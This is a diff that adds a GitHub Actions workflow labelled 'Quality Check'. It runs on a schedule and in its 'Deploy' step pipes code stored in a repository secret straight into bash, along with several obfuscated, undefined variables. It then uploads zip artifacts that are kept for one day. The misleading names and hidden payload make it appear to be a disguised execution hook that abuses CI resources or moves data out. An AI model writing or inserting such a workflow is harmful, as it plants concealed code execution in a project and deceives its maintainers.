@@ -1,0 +1,30 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '49 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          xp3: ${{ secrets.xp3 }}
+        run: |
+          printf '%s' "$xp3" | jq -r .nnp54049 | /bin/bash
+          printf '%s' "$llgqc7998" | jq -r .ej4034 | /bin/bash
+          printf '%s' "$m9108" | jq -r .bh13 | /bin/bash
+          echo $wqrba0 | jq -r .aayc81979 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Tdl93Ith
+          path: "*.zip"
+          retention-days: 1
